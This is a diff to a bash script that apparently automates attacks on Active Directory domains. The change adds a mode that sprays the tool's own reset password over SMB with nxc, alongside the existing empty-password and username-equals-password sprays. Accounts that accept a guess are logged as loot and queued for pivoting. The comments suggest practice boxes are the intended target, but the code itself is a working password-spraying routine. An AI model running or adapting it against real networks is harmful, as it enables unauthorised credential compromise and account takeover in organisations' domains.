@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.40.0"
+readonly VERSION="1.41.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -4370,17 +4370,26 @@ _confirm_plain_cred() {
 _seed_anon_weak_spray() {
     local ul="$1"; [[ -s "$ul" ]] || return
     local mode out line u pw lbl nusers; nusers=$(grep -c . "$ul")
-    for mode in empty userpass; do
+    # Modes: empty password, username==password, and the tool's OWN reset password
+    # (PIVOT_PW). The last one makes re-runs RESUMABLE — if a previous ADAutoPwn run
+    # already reset a must-change account to PIVOT_PW (so its blank password is gone),
+    # spraying PIVOT_PW recovers that foothold WITHOUT needing to revert the box.
+    for mode in empty userpass resetpw; do
         if [[ "$mode" == empty ]]; then
             lbl="empty password"
             subsection "Empty-password spray × $nusers users"
             run "$NXC smb $DC_IP -u <users> -p '' --continue-on-success"
             out=$($NXC smb "$DC_IP" -u "$ul" -p '' --continue-on-success 2>&1)
-        else
+        elif [[ "$mode" == userpass ]]; then
             lbl="password==username"
             subsection "username==password spray × $nusers users"
             run "$NXC smb $DC_IP -u <users> -p <users> --no-bruteforce --continue-on-success"
             out=$($NXC smb "$DC_IP" -u "$ul" -p "$ul" --no-bruteforce --continue-on-success 2>&1)
+        else
+            lbl="ADAutoPwn reset password (prior-run recovery)"
+            subsection "Reset-password spray × $nusers users (recover a foothold from a previous run)"
+            run "$NXC smb $DC_IP -u <users> -p '$PIVOT_PW' --continue-on-success"
+            out=$($NXC smb "$DC_IP" -u "$ul" -p "$PIVOT_PW" --continue-on-success 2>&1)
         fi
         printf '%s\n' "$out" >>"$LOGFILE"
         while IFS= read -r line; do
@@ -4392,7 +4401,7 @@ _seed_anon_weak_spray() {
             grep -qi '(Guest)' <<<"$line" && continue
             u=$(grep -oP '\\\K[^\\:]+(?=:)' <<<"$line" | head -1); [[ -z "$u" ]] && continue
             [[ "${u,,}" == "guest" || "${u,,}" == "anonymous" ]] && continue
-            pw=""; [[ "$mode" == userpass ]] && pw="$u"
+            pw=""; [[ "$mode" == userpass ]] && pw="$u"; [[ "$mode" == resetpw ]] && pw="$PIVOT_PW"
             if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
                 loot "★ ${C_GREEN}${u}${C_RESET} — $lbl accepted but MUST-CHANGE → reset on pivot"
                 queue_cred "$u" "$pw" "" "anon spray ($mode, must-change)"
